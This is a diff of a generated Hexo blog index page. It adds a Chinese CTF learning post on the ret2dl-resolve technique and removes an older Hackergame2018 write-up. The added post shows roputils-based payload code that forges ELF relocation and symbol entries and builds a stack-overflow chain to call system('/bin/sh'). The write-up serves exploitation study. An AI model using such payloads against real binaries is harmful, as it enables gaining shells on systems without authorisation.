@@ -261,6 +261,177 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/04/25/return-to-dl-resolve-菜鸡初学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/04/25/return-to-dl-resolve-菜鸡初学习/" itemprop="url">return to dl-resolve--菜鸡初学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-25T11:35:10+08:00">
+                2019-04-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  818
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>身为一个小菜鸡，今年的国赛打的很是难受，第一天的题目难度我差不多能做出来。但是很可惜的是，我那天刚好赶火车，还有其他事情。太惨了，只搞了一道题目，结果第二天的题目难度感觉好难啊。</p>
+<p>第二天放出来的第一道pwn题目是babypwn，看到这个名字我就是知道肯定不是好鸟。然后开始审题目，以为很简单的一个栈溢出，结果找不到write函数写。shellcode也无法执行，rop链由于没有int 80h中断也别想了。所以，没什么思路。</p>
+<p>结果房建师傅做出来后和我说是去年0ctf的原题。。。好吧，去看看了，学习了一波ret2dl-resolve。</p>
+<p>查阅了一些资料知道了，这种利用方式有简单的也有麻烦的，这里只介绍简单的，因为我就会简单的emmm</p>
+<p>所谓的简单的方法就是利用别人已经写好的一些函数达到我们的目的，也就是</p>
+<p><a href="https://github.com/ppcrab/ret2dl-resolve-.git" target="_blank" rel="noopener">https://github.com/ppcrab/ret2dl-resolve-.git</a></p>
+<p>下面是最简单的入门级别的利用：</p>
+<p>使用这个库的第一步是rop = roputils.ROP(‘./pwn’)</p>
+<p>首先我们栈溢出到bss段的首地址，bss的首地址为0x804a040，那就进行这个地方的任意写。(话说，如果能做到任意地址写，直接使用这个思路岂不是就ok了)</p>
+<p>如果程序开启了ple，就使用这个roputils库自带的函数rop.section(‘.bss’)。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">buf2 =  rop.string(<span class="string">'/bin/sh'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">20</span>, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss + <span class="number">20</span>, <span class="string">'system'</span>)</span><br><span class="line">buf2 += rop.fill(<span class="number">100</span>, buf2)</span><br></pre></td></tr></table></figure>
+<p>这些代码干了些什么都比较明了，只有第三行需要解释以下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dl_resolve_data</span><span class="params">(self, base, name)</span>:</span></span><br><span class="line">        jmprel = self.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">        relent = self.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line">        symtab = self.dynamic(<span class="string">'SYMTAB'</span>)</span><br><span class="line">        syment = self.dynamic(<span class="string">'SYMENT'</span>)</span><br><span class="line">        strtab = self.dynamic(<span class="string">'STRTAB'</span>)</span><br><span class="line"></span><br><span class="line">        addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">        addr_sym, padlen_sym = self.align(addr_reloc+relent, symtab, syment)</span><br><span class="line">        addr_symstr = addr_sym + syment</span><br><span class="line"></span><br><span class="line">        r_info = (((addr_sym - symtab) / syment) &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">        st_name = addr_symstr - strtab</span><br><span class="line"></span><br><span class="line">        buf = self.fill(padlen_reloc)</span><br><span class="line">        buf += struct.pack(<span class="string">'&lt;II'</span>, base, r_info)                      <span class="comment"># Elf32_Rel</span></span><br><span class="line">        buf += self.fill(padlen_sym)</span><br><span class="line">        buf += struct.pack(<span class="string">'&lt;IIII'</span>, st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span>)             <span class="comment"># Elf32_Sym</span></span><br><span class="line">        buf += self.string(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf</span><br></pre></td></tr></table></figure>
+<p>从<code>base</code>开始便是用户可控的区域，也是用来构造伪<code>Elf32_Rel</code>, 伪<code>Elf32_Sym</code>，和符号名称的地方。具体的存放地址，还是根据数组条目的大小进行了对齐。而需要检查的地方，则全部硬编码了，只需计算这些伪条目对应在数组中的index填充即可。</p>
+<p>这一次操作的目的可以看作是伪造，就像是伪造chunk块一样。都是为了下一步的攻击做准备</p>
+<p>而具体的攻击就落实到了</p>
+<p>buf3 = ‘A’ * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dl_resolve_call</span><span class="params">(self, base, *args)</span>:</span></span><br><span class="line">    jmprel = self.dynamic(<span class="string">'JMPREL'</span>)</span><br><span class="line">    relent = self.dynamic(<span class="string">'RELENT'</span>)</span><br><span class="line"></span><br><span class="line">    addr_reloc, padlen_reloc = self.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line"></span><br><span class="line">    buf = self.p(self.plt())</span><br><span class="line">    buf += self.p(reloc_offset)</span><br><span class="line">    buf += self.p(self.gadget(<span class="string">'pop'</span>, n=len(args)))</span><br><span class="line">    buf += self.p(args)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> buf</span><br></pre></td></tr></table></figure>
+<p>可以看到，这里将所调用的函数的参数及返回的gadget放在栈上，再往上便是构造的伪<code>Elf32_Rel</code>条目的offset，最后则是<code>.plt</code>起始处的地址，在那里会完成将<code>link_map</code>放至栈上及调用<code>_dl_runtime_resolve</code>。</p>
+<p>一个对于这个知识点介绍的十分详细的博客，也是我主要参考的博客</p>
+<p><a href="https://rk700.github.io/2015/08/09/return-to-dl-resolve/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://rk700.github.io/2015/08/09/return-to-dl-resolve/?tdsourcetag=s_pctim_aiomsg</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/04/24/chunk块的伪造1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1725,161 +1896,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2018/10/16/Hackergame2018/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/16/Hackergame2018/" itemprop="url">Hackergame2018</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-16T22:45:17+08:00">
-                2018-10-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  493
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>这个比赛虽然没有一直在弄，但是还是看了其中的好几个题目。<br>学习了好几个姿势~</p>
-<h3 id="在程序初始化阶段进行操作"><a href="#在程序初始化阶段进行操作" class="headerlink" title="在程序初始化阶段进行操作~"></a>在程序初始化阶段进行操作~</h3><p>使用gcc 的 <strong>attribute</strong>((constructor)) 一系列操作可以做到在程序初始化阶段进行一些操作。<br>比如这个C语言作业题目就是在程序初始化阶段就定义了一些代码。</p>
-<h3 id="触发-SIGFPE-的情况"><a href="#触发-SIGFPE-的情况" class="headerlink" title="触发 SIGFPE 的情况"></a>触发 SIGFPE 的情况</h3><p>不仅除以 0 可能会触发 SIGFPE，最小的 INT 除以 -1 也可能会触发。这就很难受了，我知道这个题目的第一步就是去将异常情况触发，然后运行_err函数，但是。。。我不知道怎么弄。现在知道了，居然除了除以0，还能 -2147483648/-1。吐血</p>
-<h3 id="linux命令。"><a href="#linux命令。" class="headerlink" title="linux命令。"></a>linux命令。</h3><p>进入vim命令行中之后，可以使用esc退出，然后输入‘：’，就可以输入想要运行的命令了，输入完毕后直接回车。cat - 中的 - 表示标准输入，cat 会试图从你的标准输入中读取，并不能看到 - 文件的内容。绕过的办法有多种，最简单的就是 cat ./-。不得不说linux命令还是很值的学习的。<br>除此之外还有好几种方式可以达到执行linux命令的结果，比如进入linux下的gdb模式。就可以输入命令了，相比之下，还比进入vim更快呢。</p>
-<h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>逆向的赛题是有一定的思路的，一般我们先会运行一下这个程序，看看主函数一开始干了什么，然后去找主函数，看看有没有什么发现。然后再去找字符串，从字符串入手，如果到现在还是没有十分明确的思路，那么只能从系统函数入手，一般加密的程序会涉及到字符串的一些操作，比如字符串倒转啊strrev(),字符串比较啊，字符串复制啊。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1934,7 +1950,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-count">40</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2001,7 +2017,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -2015,7 +2031,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">24.7k</span>
+    <span title="Site words total count">27.4k</span>
   
 </div>
 
